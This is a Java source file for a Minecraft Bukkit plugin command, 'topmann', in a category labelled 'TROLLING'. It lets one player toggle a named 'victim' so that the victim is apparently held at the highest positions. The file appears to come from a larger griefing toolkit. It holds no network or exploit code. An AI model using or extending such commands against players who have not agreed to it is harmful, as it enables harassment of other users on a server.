package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class Command_TOPMANN2 extends CommandBase {

    private final ArrayList<Player> players = new ArrayList<>();

    public Command_TOPMANN2() {
        super("topmann", "<Spieler>", Category.TROLLING);
        Bukkit.getScheduler().runTaskTimer(Start.INSTANCE, new Command_TOPMANN(this), 1L, 1L);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player vic = Bukkit.getPlayer(args[1]);
                if (!this.players.contains(vic)) {
                    this.players.add(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "§aDieser Spieler kann sich nun nur auf den höchsten Positionen befinden.");
                } else {
                    this.players.remove(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "§cDer Spieler läuft nun normal.");
                }
            } catch (Exception ignored) {
            }
        }
    }

    static ArrayList<Player> getPlayersFromInstance(Command_TOPMANN2 var0) {
        return var0.players;
    }

}
